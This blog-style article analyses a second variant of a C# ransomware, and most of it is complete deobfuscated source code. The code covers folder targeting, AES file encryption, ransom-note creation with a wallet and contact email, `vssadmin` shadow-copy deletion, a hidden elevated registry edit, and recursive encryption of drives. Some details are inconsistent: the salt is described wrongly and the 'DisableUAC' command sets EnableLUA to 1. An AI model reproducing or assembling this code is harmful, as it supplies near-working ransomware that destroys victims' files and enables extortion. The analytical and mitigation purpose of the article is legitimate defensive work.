# 🔍 Deobfuscating and Analyzing a C# Ransomware (Version 2) 🕵️‍♂️

This article analyzes a second variant of a heavily obfuscated C# ransomware, similar to the previously examined version but with distinct differences in configuration, such as the Bitcoin wallet, contact email, ransom amount, and file extension. The ransomware encrypts files, demands a Bitcoin ransom, and modifies system settings, using cryptic variable names to obscure its intent. Below, we deobfuscate the code, break down its key components, provide complete deobfuscated source code for each section, and highlight differences from the first variant, using emojis to emphasize key points.

---

## 🛠️ Overview of the Ransomware

This ransomware, written in C#, performs the following actions:
- **Encrypts files** in user directories (e.g., Desktop, Documents, Pictures) using AES encryption.
- **Generates a ransom note** demanding $500 in Bitcoin for decryption.
- **Modifies system settings**, including disabling User Account Control (UAC) and deleting volume shadow copies to prevent recovery.
- **Lacks external communication** unlike the first variant, which logged activity via a URL.

The obfuscation techniques include:
- Cryptic variable names (e.g., `UDAxFM6UUGgre9TPDi0ZfRtlYSRYyh0l`).
- Concatenated path strings to hide targeted directories.
- Hardcoded cryptographic keys and configuration settings.

Let’s deobfuscate and analyze the key components, comparing them to the first variant.

---

## 📂 1. File Path Construction

### 🔍 Analysis
The ransomware targets user directories (e.g., Desktop, Documents, Downloads) by constructing paths using environment variables and string concatenation. The variable names, such as `xFfM6DgfAxFM6UDAxFfM6DAxFM6UfDi0ZfR` for `C:\`, are identical to the first variant, indicating shared code origins.

### 🧹 Deobfuscated Code
```csharp
public static string RootDrive = "C:\\";
public static string UsersFolder = "Users\\";
public static string Username = Environment.UserName;

public static string DesktopPath = $"{RootDrive}{UsersFolder}{Username}\\Desktop";
public static string LinksPath = $"{RootDrive}{UsersFolder}{Username}\\Links";
public static string ContactsPath = $"{RootDrive}{UsersFolder}{Username}\\Contacts";
public static string DocumentsPath = $"{RootDrive}{UsersFolder}{Username}\\Documents";
public static string DownloadsPath = $"{RootDrive}{UsersFolder}{Username}\\Downloads";
public static string PicturesPath = $"{RootDrive}{UsersFolder}{Username}\\Pictures";
public static string MusicPath = $"{RootDrive}{UsersFolder}{Username}\\Music";
public static string OneDrivePath = $"{RootDrive}{UsersFolder}{Username}\\OneDrive";
public static string SavedGamesPath = $"{RootDrive}{UsersFolder}{Username}\\Saved Games";
public static string FavoritesPath = $"{RootDrive}{UsersFolder}{Username}\\Favorites";
public static string SearchesPath = $"{RootDrive}{UsersFolder}{Username}\\Searches";
public static string VideosPath = `${RootDrive}{UsersFolder}{Username}\\Videos";
```

### 📝 Explanation
- **Purpose**: Defines paths for encryption targets.
- **Deobfuscation**: Replaced obfuscated names with clear ones (e.g., `DesktopPath` for `DAxFM6UUGgre9TPDi0ZfRtlYSRYyh0lM6UUGgre`) and used string interpolation.
- **Comparison to Variant 1**: Identical path construction, targeting the same directories.
- **Impact**: Ensures the ransomware affects critical user files across multiple directories.

---

## 🔐 2. File Encryption Logic

### 🔍 Analysis
The ransomware uses AES (Rijndael) encryption with a hardcoded password (`o6806642kbM7c5`) and salt (`SALT`). It appends a `.cantopen` extension to encrypted files (different from `.CMLOCKER` in the first variant) and supports an extensive list of file extensions, with minor additions like `.cer`, `.cert`, and `.ppk`.

### 🧹 Deobfuscated Code
```csharp
public static byte[] Salt = Encoding.ASCII.GetBytes("o6806642kbM7c5");
public static int Iterations = 2000;
public static int KeySize = 256;
public static int BlockSize = 128;
public static string FileExtension = ".cantopen";

public static byte[] EncryptFile(byte[] fileData, byte[] password)
{
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using (RijndaelManaged rijndael = new RijndaelManaged())
        {
            rijndael.KeySize = KeySize;
            rijndael.BlockSize = BlockSize;
            Rfc2898DeriveBytes keyDerivation = new Rfc2898DeriveBytes(password, Salt, Iterations);
            rijndael.Key = keyDerivation.GetBytes(rijndael.KeySize / 8);
            rijndael.IV = keyDerivation.GetBytes(rijndael.BlockSize / 8);
            rijndael.Mode = CipherMode.CBC;

            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(fileData, 0, fileData.Length);
                cryptoStream.Close();
            }
            return memoryStream.ToArray();
        }
    }
}

public static void EncryptFileOnDisk(string filePath, string password)
{
    byte[] fileData = File.ReadAllBytes(filePath);
    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
    byte[] encryptedData = EncryptFile(fileData, passwordBytes);
    File.WriteAllBytes(filePath, encryptedData);
    File.Move(filePath, filePath + FileExtension);
}
```

### 📝 Explanation
- **Purpose**: Encrypts files using AES-CBC and renames them with `.cantopen`.
- **Deobfuscation**: Renamed functions and variables (e.g., `NmbndiY3YyN2iY3YyN2R2ZAdycGNmbndiY3YyN2iY3mdiY3YyN2R2ZAdycGNmbndiY3YyN2YyN2R2ZAdycGN` to `EncryptFile`) for clarity.
- **Comparison to Variant 1**: Same encryption algorithm and password, but uses `.cantopen` instead of `.CMLOCKER` and includes additional file extensions.
- **Impact**: Renders files inaccessible, with the new extension signaling infection.

---

## 📜 3. Ransom Note Generation

### 🔍 Analysis
The ransomware creates a `HELP_DECRYPT_YOUR_FILES.txt` file in each targeted directory, demanding $500 in Bitcoin to a new wallet (`bc1q6ug0vrxz66d564qznclu9yyyvn6zurskezmt64`) and providing a different email (`CCWhite@onionmail.org`) for contact, compared to $980 and `leljicok@gmail.com` in the first variant.

### 🧹 Deobfuscated Code
```csharp
public static string BitcoinWallet = "bc1q6ug0vrxz66d564qznclu9yyyvn6zurskezmt64";
public static string ContactEmail = "CCWhite@onionmail.org";
public static string RansomAmount = "500";

public static void CreateRansomNote(string directory, string personalId)
{
    string[] ransomNote = new string[]
    {
        "Oops All Of your important files were encrypted Like document pictures videos etc..\r\n\r\n" +
        "Don't worry, you can return all your files!\r\n" +
        "All your files, documents, photos, databases and other important files are encrypted by a strong encryption. \r\n\r\n" +
        "How to recover files?\r\n" +
        "RSA is a asymmetric cryptographic algorithm, you need one key for encryption and one key for decryption so you need private key to recover your files. " +
        "It’s not possible to recover your files without private key.\r\n" +
        "The only method of recovering files is to purchase an unique private key. Only we can give you this key and only we can recover your files.\r\n\r\n" +
        "What guarantees you have?\r\n" +
        "As evidence, you can send us 1 file to decrypt by email We will send you a recovery file Prove that we can decrypt your file\r\n\r\n" +
        "Please You must follow these steps carefully to decrypt your files:\r\n" +
        $"Send ${RansomAmount} worth of bitcoin to wallet: {BitcoinWallet}\r\n" +
        "after payment, we will send you Decryptor software\r\n" +
        $"contact email: {ContactEmail}\r\n\r\n" +
        $"Your personal ID: {personalId}"
    };
    try
    {
        File.WriteAllLines(Path.Combine(directory, "HELP_DECRYPT_YOUR_FILES.txt"), ransomNote);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Informs victims of the encryption and ransom demands.
- **Deobfuscation**: Simplified variable names (e.g., `M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUG` to `BitcoinWallet`) and formatted the note.
- **Comparison to Variant 1**: Lower ransom ($500 vs. $980), different Bitcoin wallet, and a new email address using an onion domain, suggesting a shift to Tor-based communication.
- **Impact**: Pressures victims to pay, with updated payment details.

---

## 🌐 4. External Communication (Absent)

### 🔍 Analysis
Unlike the first variant, which logged infections via `https://iplogger.com/2De1W6`, this version has an empty `lYSRYyh0lM6UUGgreUUGsfdsdgdg` string, indicating no external communication. The related method still exists but is effectively non-functional.

### 🧹 Deobfuscated Code
```csharp
public static string TrackingUrl = ""; // Empty in this variant

public static void LogInfection()
{
    try
    {
        if (!string.IsNullOrEmpty(TrackingUrl))
        {
            Process.Start(TrackingUrl);
        }
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Intended to log infections, but disabled in this variant.
- **Deobfuscation**: Renamed `ZAdycGNmb2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmbnsfdiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnsf` to `LogInfection` and added a check for an empty URL.
- **Comparison to Variant 1**: The absence of a tracking URL suggests a change in attacker strategy, possibly to reduce traceability.
- **Impact**: No victim data is sent externally, making this variant stealthier but less trackable by attackers.

---

## 🛡️ 5. System Modifications

### 🔍 Analysis
The ransomware disables UAC and deletes volume shadow copies to hinder recovery, using the same command-line executions as the first variant.

### 🧹 Deobfuscated Code
```csharp
public static void DisableUAC()
{
    try
    {
        string arguments = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\

SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f";
        ProcessStartInfo processInfo = new ProcessStartInfo("CMD.EXE")
        {
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = false,
            UseShellExecute = true,
            Arguments = arguments,
            Verb = "runas"
        };
        Process.Start(processInfo);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}

public static void DeleteShadowCopies()
{
    try
    {
        ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        };
        Process process = new Process { StartInfo = processInfo };
        process.Start();
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Modifies system settings to maximize damage and prevent recovery.
- **Deobfuscation**: Renamed functions (e.g., `ZAdycGNmb2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmbn` to `DisableUAC`) and clarified commands.
- **Comparison to Variant 1**: Identical system modification logic, indicating no changes in this functionality.
- **Impact**: Disabling UAC and deleting shadow copies reduces security and recovery options.

---

## 🚀 6. Main Execution Flow

### 🔍 Analysis
The `Main` method orchestrates the ransomware’s actions: initializing variables, modifying system settings, and encrypting files. The `YyNYyN2iY3YyN2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbndiY3Yy` method handles encryption across directories, similar to the first variant but without the external logging step.

### 🧹 Deobfuscated Code
```csharp
public static string Email = ContactEmail;
public static string PersonalId;
public static string EncryptionKey = mbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmYyYyN2iY3(30); // Random string generator

[STAThread]
public static void Main()
{
    Email = ContactEmail;
    DisableUAC();
    DeleteShadowCopies();
    EncryptDirectories();
    DeleteShadowCopies(); // Called twice, as in original
    LogInfection(); // No effect due to empty TrackingUrl
}

public static void EncryptDirectories()
{
    try
    {
        byte[] encryptedKey = ZAdycGNmb2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbnyN2R2ZAdycGNmbnsfdiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNm(Email).Encrypt(Encoding.UTF8.GetBytes(EncryptionKey), false);
        PersonalId = Convert.ToBase64String(encryptedKey);

        if (bool.Parse("True")) // lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfgdg
        {
            foreach (string drive in Directory.GetLogicalDrives())
            {
                if (drive != "C:\\")
                {
                    EncryptDirectory(drive, EncryptionKey);
                    CreateRansomNote(drive, PersonalId);
                }
            }
        }

        if (bool.Parse("True")) EncryptDirectory(DesktopPath, EncryptionKey); CreateRansomNote(DesktopPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(LinksPath, EncryptionKey); CreateRansomNote(LinksPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(ContactsPath, EncryptionKey); CreateRansomNote(ContactsPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(DocumentsPath, EncryptionKey); CreateRansomNote(DocumentsPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(DownloadsPath, EncryptionKey); CreateRansomNote(DownloadsPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(PicturesPath, EncryptionKey); CreateRansomNote(PicturesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(MusicPath, EncryptionKey); CreateRansomNote(MusicPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(OneDrivePath, EncryptionKey); CreateRansomNote(OneDrivePath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(SavedGamesPath, EncryptionKey); CreateRansomNote(SavedGamesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(FavoritesPath, EncryptionKey); CreateRansomNote(FavoritesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(SearchesPath, EncryptionKey); CreateRansomNote(SearchesPath, PersonalId);
        if (bool.Parse("True")) EncryptDirectory(VideosPath, EncryptionKey); CreateRansomNote(VideosPath, PersonalId);
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        MessageBox.Show("ERROR");
        ProjectData.ClearProjectError();
    }
}

public static void EncryptDirectory(string directory, string password)
{
    string supportedExtensions = ".txt.doc.docx.mp3.xls.xlsx.ppt.sql.wmv.mp4.mp3.dll.jar.pptx.odt.jpg.tar.gz.bmp.pbm.rtf.png.csv.sql.mdb.sln.phpavi.mov.flv.amv.mpv.mtv.asp.aspx.html.xml.psd.pdf.exe.rv.rvx.ved.wm.wmv.TXT.JPG.rar.xwmv.wma.midi.fla.pdf.wma.ico.gif.GIF.ogg.mpg.icns.RAR.png.zip.BAT.Exe.c.exe.PNG.7z.exe.EXE.sql.mp4.7z.rar.m4a.wma.avi.wmv.csv.d3dbsp.zip.sie.sum.ibank.t13.t12.qdf.gdb.tax.pkpass.bc6.bc7.bkp.qic.bkf.sidn.sidd.mddata.itl.itdb.icxs.hvpl.hplg.hkdb.mdbackup.syncdb.gho.cas.svg.map.wmo.itm.sb.fos.mov.vdf.ztmp.sis.sid.ncf.menu.layout.dmp.blob.esm.vcf.vtf.dazip.fpk.mlx.kf.iwd.vpk.tor.psk.rim.w3x.fsh.ntl.arch00.lvl.snx.cfr.ff.vpp_pc.lrf.m2.mcmeta.vfs0.mpqge.kdb.db0.dba.rofl.hkx.bar.upk.das.iwi.litemod.asset.forge.ltx.bsa.apk.re4.sav.lbf.slm.bik.epk.rgss3a.pak.bigwallet.wotreplay.xxx.desc.py.m3u.flv.js.css.rb.png.jpeg.txt.p7c.p7b.p12.pfx.pem.crt.cer.der.x3f.srw.pef.ptx.r3d.rw2.rwl.raw.raf.orf.nrw.mrwref.mef.erf.kdc.dcr.cr2.crw.cerber.WNCRY.dsewrbg.bay.sr2.srf.arw.3fr.dng.jpe.jpg.cdr.indd.ai.eps.pdf.pdd.psd.dbf.mdf.wb2.rtf.wpd.dxg.xf.dwg.pst.vbs.accdb.mdb.pptm.pptx.ppt.xlk.xlsb.xlsm.xlsx.xls.wps.docm.docx.doc.odb.odc.odm.odp.ods.odt.cer.cert.ppk";

    try
    {
        string[] files = Directory.GetFiles(directory);
        string[] subdirectories = Directory.GetDirectories(directory);

        foreach (string file in files)
        {
            string extension = Path.GetExtension(file);
            if (supportedExtensions.Contains(extension))
            {
                EncryptFileOnDisk(file, password);
            }
        }

        foreach (string subdirectory in subdirectories)
        {
            EncryptDirectory(subdirectory, password);
            CreateRansomNote(subdirectory, PersonalId);
        }
    }
    catch (Exception ex)
    {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
    }
}
```

### 📝 Explanation
- **Purpose**: Coordinates encryption and ransom note placement.
- **Deobfuscation**: Simplified method names (e.g., `YyNYyN2iY3YyN2R2ZAdycGNmbndiY3YyYyN2iY3YyN2R2ZAdycGNmbndiY3Yy2iY3YyN2R2ZAdycGNmbndiY3Yy` to `EncryptDirectories`) and clarified logic.
- **Comparison to Variant 1**: Identical structure, but lacks the external logging step and uses updated ransom details.
- **Impact**: Encrypts files across multiple directories, leaving ransom notes to extort victims.

---

## 🛑 Mitigation and Recommendations

To protect against this ransomware:
- **Backups**: Maintain offline backups to restore files without paying.
- **Security Software**: Use antivirus to detect and block malicious executables.
- **User Awareness**: Educate users to avoid suspicious downloads or attachments.
- **System Hardening**: Disable unnecessary services and enforce least privilege.
- **Email Monitoring**: Watch for communications to `CCWhite@onionmail.org`, which may indicate infection.

---

## 🎉 Conclusion

This second variant of the C# ransomware shares much of its codebase with the first but introduces changes like a lower ransom ($500), a new Bitcoin wallet, an onion-based email, and a `.cantopen` extension. The absence of external logging makes it stealthier, though it retains the same encryption and system modification tactics. By deobfuscating the code, we’ve clarified its functionality, providing complete source code for each component. Understanding these variants is key to developing robust defenses against ransomware threats. Stay vigilant! 🛡️